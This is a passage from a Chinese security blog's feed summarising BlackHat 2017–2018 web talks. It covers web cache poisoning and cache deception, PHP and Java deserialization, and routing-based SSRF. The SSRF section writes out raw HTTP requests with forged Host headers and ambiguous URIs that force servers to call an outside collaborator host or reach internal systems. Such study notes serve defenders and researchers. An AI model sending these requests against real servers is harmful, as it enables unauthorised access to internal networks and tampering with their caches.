href="#0x03-WebAssembly-A-New-World-of-Native-Exploits-on-the-Browser（WebAssembly：浏览器漏洞的新世界）" class="headerlink" title="0x03 WebAssembly: A New World of Native Exploits on the Browser（WebAssembly：浏览器漏洞的新世界）"></a>0x03 WebAssembly: A New World of Native Exploits on the Browser（WebAssembly：浏览器漏洞的新世界）</h2><p>PDF：</p><p><a href="http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web.pdf" target="_blank" rel="noopener">http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web.pdf</a></p><p><a href="http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf" target="_blank" rel="noopener">http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf</a></p><p>其他参考：</p><p><a href="https://xz.aliyun.com/t/3672" target="_blank" rel="noopener">WebAssembly的安全性问题–Part 1</a></p><p><a href="https://xz.aliyun.com/t/3673" target="_blank" rel="noopener">WebAssembly的安全性问题–Part 2</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>WebAssembly是由W3C社区组开发的一项新技术。WebAssembly允许开发人员将他们本机的C/C++代码带到浏览器，代码由最终用户以接近本机的性能运行。WebAssembly已经在所有主流浏览器的最新版本中得到广泛支持，目前正在许多基于Web的服务中被使用。值得注意的例子包括3D模型渲染，界面设计和可视化数据处理。 WebAssembly仍处于开发的早期阶段，开发人员很可能会在未来发现新的用法。</p><p>WebAssembly(Wasm)是一种机器语言(可能应该被命名为“WebBytecode”)，被设计在有限的虚拟机上运行(想想JVM，而不是VMware)。然后可以将此虚拟机嵌入到其他程序(尤其是浏览器)中。Wasm虚拟机与程序或系统的其他部分隔离，只能通过特殊枚举的导入和导出与其宿主程序进行通信。大多数程序不会由作者直接在Wasm中编写，甚至也不会以用户友好的文本格式编写。其目标是把其他语言编译成Wasm。Wasm已经相对完整，可以让用户从低级语言中获得的许多功能。</p><p>Emscripten是目前最流行的WebAssembly编译器工具链，是Mozilla的Alon Zakai开发的一个独特LLVM后端，可以将任意LLVM中间码编译成JavaScript，大大简化了现有代码在Web时代的重用。简单地说，Emscripten就是可以把C/C++代码编译可执行代码在HTML上运行。</p><p>在本次议题中，作者介绍了在Emscripten上发现为增强WebAssembly而引入的新方法所带来的新漏洞，这些漏洞可以劫持控制流，甚至在网页上下文中执行任意JavaScript代码。</p><p>更多的解说看先知文章即可，这里没Demo也不copy了。</p><h2 id="0x04-Practical-Web-Cache-Poisoning-Redefining-‘Unexploitable’（缓存投毒攻击）"><a href="#0x04-Practical-Web-Cache-Poisoning-Redefining-‘Unexploitable’（缓存投毒攻击）" class="headerlink" title="0x04 Practical Web Cache Poisoning: Redefining ‘Unexploitable’（缓存投毒攻击）"></a>0x04 Practical Web Cache Poisoning: Redefining ‘Unexploitable’（缓存投毒攻击）</h2><p>PDF：</p><p><a href="http://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf" target="_blank" rel="noopener">http://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf</a></p><p>PortSwigger官方博客参考：</p><p><a href="https://portswigger.net/research/practical-web-cache-poisoning" target="_blank" rel="noopener">https://portswigger.net/research/practical-web-cache-poisoning</a></p><h3 id="Web缓存和投毒"><a href="#Web缓存和投毒" class="headerlink" title="Web缓存和投毒"></a>Web缓存和投毒</h3><p>现在很多Web站点都使用了缓存技术来加速访问速度，比如浏览器本地缓存、DNS缓存等等。</p><p>如图，第一个用户访问a页面，第二、三个用户也访问a页面，缓存服务器会把第一个用户访问的a页面内容传给第二、三个用户：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/45.png" alt=""></p><p>那么问题来了，如何区分请求是不是同一个呢？这是缓存服务器需要继续解决的。不可能对请求的每一个字节都匹配校验，比如在不同浏览器请求同一个页面，就会造成User-Agent不同，但实际上这是需要返回缓存页面内容的：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/46.png" alt=""></p><p>此时，Cache Key出现了，缓存服务器通过标记某个位置来判断请求是否一致。如下图，通过请求接口URL和Host，在缓存服务器上算出一个Hash值，对于每个请求，如果请求接口URL和Host算出来的Hash值是同一个，则返回之前的缓存。此时会将用户A的访问数据传递给用户B，但实际上用户A和用户B的身份是不一样的：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/47.png" alt=""></p><p>作者指出，可以在返回报文头中使用Vary来告知客户端哪个是Cache Key的，但是实际测试过程中发现大型的CDN服务商都忽略了Vary。同时，他还发现了许多Web缓存服务器其实支持基于很多其他请求头来缓存页面内容，并且这些请求不在Cache Key的范围。换句话说，<strong>就是攻击者可以通过构造特殊请求头向缓存页面注入恶意内容</strong>。</p><p>如图，作者提出的一个查找Web缓存投毒攻击的攻击流程：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/48.png" alt=""></p><p>首先使用BurpSuite的扩展插件Param Miner对特殊请求头进行模糊查找，原理是使用高级差异逻辑和二进制搜索技术，可以为每个请求猜测多大65000个参数名，还可以收集捕获流量中其他的参数作为模糊查找的字典。这一步可以找出被测接口中可以注入恶意内容的特殊请求头。</p><p>当找到特殊请求头后就开始评估危害了，注入恶意代码到缓存服务器中，当受害者命中Cache规则时，缓存服务器会把相应的恶意缓存返回给受害者：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/49.png" alt=""></p><h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><h4 id="Basic-Poisoning"><a href="#Basic-Poisoning" class="headerlink" title="Basic Poisoning"></a>Basic Poisoning</h4><p>Cache Key在X-Forwarded-Host头，注入点在响应内容的meta标签的content属性值中。</p><p>在检测阶段，发现关键的Cache Key是X-Forwarded-Host头：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/50.png" alt=""></p><p>接着进入评估和注入阶段，通过X-Forwarded-Host头注入XSS payload到缓存服务器上。此时当其他用户访问同样的URL时，都会受到XSS攻击：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/51.png" alt=""></p><h4 id="Discreet-poisoning"><a href="#Discreet-poisoning" class="headerlink" title="Discreet poisoning"></a>Discreet poisoning</h4><p>Cache Key在X-Host头，注入点在响应内容的script标签的src属性值中：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/52.png" alt=""></p><h4 id="Selective-Poisoning"><a href="#Selective-Poisoning" class="headerlink" title="Selective Poisoning"></a>Selective Poisoning</h4><p>响应包的Vary头告知我们User-Agent头是作为Cache Key的一部分的。这意味着，由于我们声称使用的是Firefox 60，因此我们的漏洞利用将仅提供给其他Firefox 60用户，也就是说这种攻击场景更有选择性。</p><p>通过X-Forwarded-Host头注入在响应内容的link标签的href属性值中：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/53.png" alt=""></p><h4 id="DOM-Poisoning"><a href="#DOM-Poisoning" class="headerlink" title="DOM Poisoning"></a>DOM Poisoning</h4><p>如下，可以控制body标签的data-site-root属性值，但并不能进行XSS攻击，冰球不清楚该属性的用途。为了解决这个问题，作者在Burp中创建了一个匹配和替换规则，向所有请求添加了<code>X-Forwarded-Host：id.burpcollaborator.net</code>头，然后浏览了该站点。加载某些页面后，Firefox将JavaScript生成的请求发送到作者的服务器：：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/54.png" alt=""></p><p>上述URL路径表明，在网站上的某个地方，有JavaScript代码使用data-site-root属性来决定从何处加载某些国际化数据。作者试图通过获取<code>https://catalog.data.gov/api/i18n/en</code>来找出这些数据应该是什么样，但是只收到了一个空的JSON响应。幸运的是，将“ en”更改为“ es”给出了一个线索。该文件包含用于将短语翻译成用户所选语言的映射。通过创建自己的翻译文件并使用缓存中毒将用户指向该文件，我们可以将短语翻译为XSS payload从而实现XSS攻击：</p><p><img src="/2020/04/20/BlackHat-2018-Web小结/55.png" alt=""></p><h4 id="其他更多的案例"><a href="#其他更多的案例" class="headerlink" title="其他更多的案例"></a>其他更多的案例</h4><p>参考官方的PDF文档即可。</p><h2 id="0x05-It’s-a-PHP-Unserialization-Vulnerability-Jim-but-Not-as-We-Know-It（不为人知的PHP反序列化漏洞）"><a href="#0x05-It’s-a-PHP-Unserialization-Vulnerability-Jim-but-Not-as-We-Know-It（不为人知的PHP反序列化漏洞）" class="headerlink" title="0x05 It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It（不为人知的PHP反序列化漏洞）"></a>0x05 It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It（不为人知的PHP反序列化漏洞）</h2><p>PDF：</p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf</a></p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></p><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>这个议题没啥好说的，就是phar反序列化漏洞，在<a href="http://www.mi1k7ea.com/2019/01/01/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">《phar反序列化漏洞》</a>中已经分析过了，而且很多CTF题目也出现过了，不再赘述。</p><h2 id="0x06-Automated-Discovery-of-Deserialization-Gadget-Chains（反序列化Gadget链自动发掘）"><a href="#0x06-Automated-Discovery-of-Deserialization-Gadget-Chains（反序列化Gadget链自动发掘）" class="headerlink" title="0x06 Automated Discovery of Deserialization Gadget Chains（反序列化Gadget链自动发掘）"></a>0x06 Automated Discovery of Deserialization Gadget Chains（反序列化Gadget链自动发掘）</h2><p>PDF：</p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf</a></p><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>作者对已有的反序列化漏洞利用工具进行了调研分析，其中ysoserial主要是针对某些特定库以及JDK ObjectInputStream的漏洞利用，但是对于非标准库的场景就没法利用了。作者针对Java提出了一种可自动发现反序列化工具链的技术，并研发了基于Java字节码发掘反序列化Gadget链的工具Gadget Inspector。</p><p>工具地址：<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">https://github.com/JackOfMostTrades/gadgetinspector</a></p><p>在研发过程中，作者枚举war包中类、方法的层次关系，发掘了直通数据流和调用图，并在此基础上使用已知的tricks枚举了可能源，最后在数据流的调用图中使用BFS算法发掘Gadget链。在性能表现上，Gadget Inspector支持对最受欢迎的前100个Java库的检测，并且在检测效果中可以发掘一些最新的Gadget链。虽然有少量的误报，但这些误报大多来自反射链。</p><p>该工具后面会深入研究，这里先不浅谈了。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="BlackHat" scheme="https://www.mi1k7ea.com/tags/BlackHat/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat 2017 Web小结</title>
    <link href="https://www.mi1k7ea.com/2020/04/19/BlackHat-2017-Web%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/04/19/BlackHat-2017-Web小结/</id>
    <published>2020-04-19T06:43:43.000Z</published>
    <updated>2020-04-19T17:05:28.729Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近整理下BlackHat 2017 Web相关议题，做下学习笔记。</p><h2 id="0x01-WEB-CACHE-DECEPTION-ATTACK（Web缓存欺骗攻击）"><a href="#0x01-WEB-CACHE-DECEPTION-ATTACK（Web缓存欺骗攻击）" class="headerlink" title="0x01 WEB CACHE DECEPTION ATTACK（Web缓存欺骗攻击）"></a>0x01 WEB CACHE DECEPTION ATTACK（Web缓存欺骗攻击）</h2><p>PDF：<a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf</a></p><p>相关参考：<a href="https://www.freebuf.com/articles/web/187538.html" target="_blank" rel="noopener">一种新型的Web缓存欺骗攻击技术</a></p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><blockquote><p>先简单介绍一下WEB缓存技术，它主要是缓存一些静态的，公开的文件，如CSS文件，JS文件，图片等。缓存分两类，一类是本地缓存，通过在浏览器上缓存实现，缓存之后通过F5刷新是不会重新获取已缓存文件的，通过Ctrl +F5强制刷新才会重新获取。另一类是在服务端实现，也就是在CDN、负载均衡、反向代理（后面统称缓存服务器）上实现，这次介绍的攻击技术就是针对这一种缓存。服务端的缓存原理是：客户端请求一个静态文件，如果缓存服务器没有缓存过这个文件，就会像WEB服务器请求，获取到静态文件返回给客户端，同时将这个文件缓存下来，下次再遇到同样的请求时就直接返回，直到这个缓存文件过期。</p><p>接下来讲一下WEB服务器解析的问题。假设客户端请求<a href="http://www.example.com/home.php/nonexistent.css" target="_blank" rel="noopener">http://www.example.com/home.php/nonexistent.css</a> 这个URL，其中home.php是真实存在的，而nonexistent.css不存在，那WEB服务器会怎么处理呢？针对这种情况的处理跟WEB服务器用的技术以及配置相关，有的会返回404 not found，有的会返回200 OK，然后把home.php返回回来。如果服务器返回200 OK就要注意了，这时缓存服务器拿到的请求是<a href="http://www.example.com/home.php/nonexistent.css，是一个静态页面，而WEB服务器返回给缓存服务器的结果是http://www.example.com/home.php，不是一个静态页面，但是缓存服务器并不知道。" target="_blank" rel="noopener">http://www.example.com/home.php/nonexistent.css，是一个静态页面，而WEB服务器返回给缓存服务器的结果是http://www.example.com/home.php，不是一个静态页面，但是缓存服务器并不知道。</a></p></blockquote><p>攻击原理如图：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/1.png" alt=""></p><ol><li>攻击者引诱已登录的用户（受害者）访问<a href="https://www.bank.com/account.do/logo.png" target="_blank" rel="noopener">https://www.bank.com/account.do/logo.png</a></li><li>受害者请求<a href="https://www.bank.com/account.do/logo.png" target="_blank" rel="noopener">https://www.bank.com/account.do/logo.png</a></li><li>缓存服务器接收到请求，没查到这个页面，于是向WEB服务器请求</li><li>WEB服务器返回<a href="https://www.bank.com/account.do，状态码是200" target="_blank" rel="noopener">https://www.bank.com/account.do，状态码是200</a> OK</li><li>缓存服务器收到结果，由于状态码是200 OK，会认为URL保持不变，然后由于这个URL以.png结尾，认为它是一个静态文件，于是会缓存这个文件</li><li>受害者得到正常结果</li><li>攻击者访问<a href="https://www.bank.com/account.do/logo.png，请求到达缓存服务器，缓存服务器直接返回受害者的缓存账户页面给攻击者，攻击完成。" target="_blank" rel="noopener">https://www.bank.com/account.do/logo.png，请求到达缓存服务器，缓存服务器直接返回受害者的缓存账户页面给攻击者，攻击完成。</a></li></ol><p>防御方法：</p><ol><li>配置缓存服务器根据http header来判断是否缓存页面；</li><li>将所有静态文件放在指定的目录，只缓存这个目录里的文件；</li><li>配置WEB服务器在解析类似<a href="http://www.example.com/home.php/nonexistent.css" target="_blank" rel="noopener">http://www.example.com/home.php/nonexistent.css</a> 这种页面时返回404或者302。</li></ol><p>更多的看参考文章即可。</p><h2 id="0x02-CRACKING-THE-LENS-TARGETING-HTTP’S-HIDDEN-ATTACK-SURFACE（HTTP的隐藏攻击面）"><a href="#0x02-CRACKING-THE-LENS-TARGETING-HTTP’S-HIDDEN-ATTACK-SURFACE（HTTP的隐藏攻击面）" class="headerlink" title="0x02 CRACKING THE LENS: TARGETING HTTP’S HIDDEN ATTACK-SURFACE（HTTP的隐藏攻击面）"></a>0x02 CRACKING THE LENS: TARGETING HTTP’S HIDDEN ATTACK-SURFACE（HTTP的隐藏攻击面）</h2><p>PDF：<a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Kettle-Cracking-The-Lens-Exploiting-HTTPs-Hidden-Attack-Surface.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/wednesday/us-17-Kettle-Cracking-The-Lens-Exploiting-HTTPs-Hidden-Attack-Surface.pdf</a></p><p>PortSwigger博客参考：<a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface" target="_blank" rel="noopener">https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>访问Web站点通常会经过许多隐藏的服务系统（包括反向代理、负载均衡器、后端分析系统等），这些系统主要用来提升用户体验、提取统计数据或提供其他服务等。正因为其隐藏的特点，导致这一层不可见的攻击面被忽略了很久。</p><p>作者使用畸形请求和特殊HTTP头是隐藏系统暴露自己，并打开了攻击内网的大门。其中，作者分享了几个隐藏系统的漏洞案例，包括Yahoo的若干服务器、拦截篡改细腻的英国ISP（BT）、哥伦比亚的ISP，将反射型XSS升级为SSRF的军方服务器等。</p><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="Listening监听"><a href="#Listening监听" class="headerlink" title="Listening监听"></a>Listening监听</h4><p>隐藏系统本身被设计为隐藏的、外部无感知的，因此无法通过响应报文来识别它们的漏洞。可以通过发送特殊的报文来让这些系统主动连接我们，然后分析产生的DNS lookup和HTTP请求，识别可能存在的漏洞。</p><p>作者使用Burp Collaborator记录了这些请求，但也可以会用自己的DNS服务器，或者使用<a href="https://canarytokens.org/" target="_blank" rel="noopener">CanaryTokens</a>。</p><h4 id="Research-Pipeline"><a href="#Research-Pipeline" class="headerlink" title="Research Pipeline"></a>Research Pipeline</h4><p>作者首先使用简单的Burp匹配/替换规则将硬编码的pingback payload注入到所有浏览器流量中。这种方法以失败告终，因为有效负载造成了如此多的pingback，以致于很难将每个单独的pingback相关联并确定哪个网站触发了它。很快也很明显，某些有效负载会在三分钟，几小时甚至每24小时一次的延迟后引起pinging。</p><p>为了有效地对pingback进行分类，作者写了Collaborator Everywhere，这是一个简单的Burp扩展，它将包含唯一标识符的payload注入所有代理流量中，并使用它们自动将pingback与相应的攻击相关联。如下图，Netflix在作者访问其网站四个小时后访问了Referer标头中指定的URL，并假装是在x86 CPU上运行的iPhone：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/2.png" alt=""></p><h4 id="Scaling-up扩大攻击面"><a href="#Scaling-up扩大攻击面" class="headerlink" title="Scaling up扩大攻击面"></a>Scaling up扩大攻击面</h4><p>测试目标域名和IP地址是从合法的漏洞奖励计划网站中筛选的。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/3.png" alt=""></p><p>为使发出的报文尽可能触发漏洞，HTTP头处理如下：</p><ul><li>Host头带多个hostname；</li><li>设置X-Forwarded-Proto头，标识Client与代理服务器之间使用的协议；</li><li>设置Cache-Control头为no-transform，禁止中间代理服务器处理请求报文；</li><li>设置Max-Forwards最大转发次数；</li></ul><p><img src="/2020/04/19/BlackHat-2017-Web小结/4.png" alt=""></p><h3 id="案例——Misrouting-Requests"><a href="#案例——Misrouting-Requests" class="headerlink" title="案例——Misrouting Requests"></a>案例——Misrouting Requests</h3><p>攻击者通过特殊的Host头来操控反向代理服务器向攻击者指定的目标发送请求，可以理解为使SSRF的变种。</p><p>反向代理服务器在组网中用于连接外网和内网，这就导致其有被SSRF利用的风险。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/5.png" alt=""></p><h4 id="Invalid-Host"><a href="#Invalid-Host" class="headerlink" title="Invalid Host"></a>Invalid Host</h4><p>触发回调的最简单方法是发送不正确的HTTP Host标头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: uniqid.burpcollaborator.net</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>成功利用的案例：</p><ul><li>27 DoD servers</li><li>ats-vm.lorax.bf1.yahoo.com</li><li>My ISP</li><li>Colombian ISP doing DNS poisoning</li></ul><p>这里看下作者对ats-vm.lorax.bf1.yahoo.com的利用</p><p>一开始还不清楚服务端运行的是什么应用软件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: XX.X.XXX.XX:8082</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/BlackHat-2017-Web小结/6.png" alt=""></p><p>接着，通过HELP命令得知了服务端运行的应用软件信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HELP / HTTP/1.1</span><br><span class="line">Host: XX.X.XXX.XX:8082</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/BlackHat-2017-Web小结/7.png" alt=""></p><p>来自服务器的众多“Unknown Command”将请求的每一行解释为单独的命令-它使用的是换行符终止的协议，这将使通过经典SSRF进行利用变得极为困难或不可能。</p><p>但幸运的是，基于路由的SSRF更加灵活，能够使用包含选择的命令的POST样式的主体发出GET请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: XX.X.XXX.XX:8082</span><br><span class="line">Content-Length: 34</span><br><span class="line"></span><br><span class="line">GET proxy.config.alarm_email</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 Connection Established</span><br><span class="line">Date: Tue, 07 Feb 2017 16:57:02 GMT</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep alive</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/BlackHat-2017-Web小结/8.png" alt=""></p><p>之后，再使用SET命令就可以对Yahoo的负载均衡器池进行广泛的配置更改，包括启用SOCKS代理并授予我的IP地址权限，以将项目直接推送到其缓存中。</p><h4 id="Handling-input-permutation"><a href="#Handling-input-permutation" class="headerlink" title="Handling input permutation"></a>Handling input permutation</h4><p>作者在测试中遇到个别服务器收到下面这个请求后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: burpcollaborator.net</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>会转发出这样的请求，即Host值放入URL中拼接两次作为URL Path，同时Host值加了outage前缀：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /burpcollaborator.net/burpcollaborator.net HTTP/1.1</span><br><span class="line">Host: outage.burpcollaborator.net</span><br><span class="line">Via: o2-b.ycpi.tp2.yahoo.net</span><br></pre></td></tr></table></figure><p>如何利用？——注册域名到内网地址，实现向内网发送请求。此外，还有vcap.me，这是一个公开的域名，其所有子域名都会被解析为127.0.0.1，再利用<code>../</code>跨路径，实现对内网<code>http://127.0.0.1</code>的访问。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/9.png" alt=""></p><p>那么，构造的利用请求报文如下即可：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/10.png" alt=""></p><p>服务端在归一化处理后得到的请求为<code>http://outage.vcap.me/?x=.vcap.me</code>，等同于<code>http://127.0.0.1/</code>的访问。</p><h4 id="Host-overriding"><a href="#Host-overriding" class="headerlink" title="Host overriding"></a>Host overriding</h4><p>在URI中的Host可以替换为Host头的值。</p><p>有些服务器会对Host头的值进行校验，但会忽视利用URI也可以传递Host头值并且比Header的优先级更高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET http://internal-website.mil/ HTTP/1.1</span><br><span class="line">Host: xxxxxxx.mil</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h4 id="Ambiguous-requests"><a href="#Ambiguous-requests" class="headerlink" title="Ambiguous requests"></a>Ambiguous requests</h4><p>含糊不清的请求，即会引起歧义的请求。</p><p>通过<code>username:pass@domainname</code>的形式来混淆域名，incapsula防火墙通过端口号来提取域名，如下面的Host头的值，防火墙认为端口号是80，域名为incapsula-client.net（合法），但实际请求转发到目标服务器后解析获取的URL为burp-collaborator.net：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: incapsula-client.net:80@burp-collaborator.net</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h4 id="Breaking-expectations"><a href="#Breaking-expectations" class="headerlink" title="Breaking expectations"></a>Breaking expectations</h4><p>还可以在URI中传递不以<code>/</code>开头、包含<code>@</code>的路径来混淆URL。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Url backendURL = &quot;http://public-backend/&quot;;</span><br><span class="line">String uri = ctx.getRequest().getRawUri();</span><br><span class="line"></span><br><span class="line">URI proxyUri;</span><br><span class="line">try &#123;</span><br><span class="line">proxyUri = new URIBuilder(uri)</span><br><span class="line">        .setHost(backendURL.getHost())</span><br><span class="line">        .setPort(backendURL.getPort())</span><br><span class="line">        .setScheme(backendURL.getScheme())</span><br><span class="line">        .build();</span><br><span class="line">&#125; catch (URISyntaxException e) &#123;</span><br><span class="line">    Util.sendError(ctx, 400, INVALID_REQUEST_URL);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对上述处理，使用下面请求报文，实际得到的URL域名被攻击者替换为了<code>http://public-backend@burp-collaborator.net</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET @burp-collaborator.net/ HTTP/1.1</span><br><span class="line">Host: newrelic.com</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h4 id="Tunnels"><a href="#Tunnels" class="headerlink" title="Tunnels"></a>Tunnels</h4><p>去掉@后的URL变形，观察会不会有服务器向xyz.burpcollaborator.net发送请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET xyz.burpcollaborator.net:80/bar HTTP/1.1</span><br><span class="line">Host: demo.globaleaks.org</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>收到了globaleaks.org服务器怪异的请求，多次pingback：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xYZ.BurpcoLLABoRaTOR.neT.    from 89.234.157.254</span><br><span class="line">Xyz.burPColLABorAToR.nET.    from 62.210.18.16 </span><br><span class="line">xYz.burpColLaBorATOR.net.    from 91.224.149.254</span><br></pre></td></tr></table></figure><p>经分析发现，跟globaleaks使用的Tor2web做隐匿请求的处理有关。</p><h3 id="案例——Targeting-auxiliary-systems"><a href="#案例——Targeting-auxiliary-systems" class="headerlink" title="案例——Targeting auxiliary systems"></a>案例——Targeting auxiliary systems</h3><p>此外，还可以关注相关备用系统的利用。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/12.png" alt=""></p><h4 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a>Gathering information</h4><p>收集信息。除了Host头，其他头字段也能被利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: store.starbucks.ca</span><br><span class="line">X-Forwarded-For: 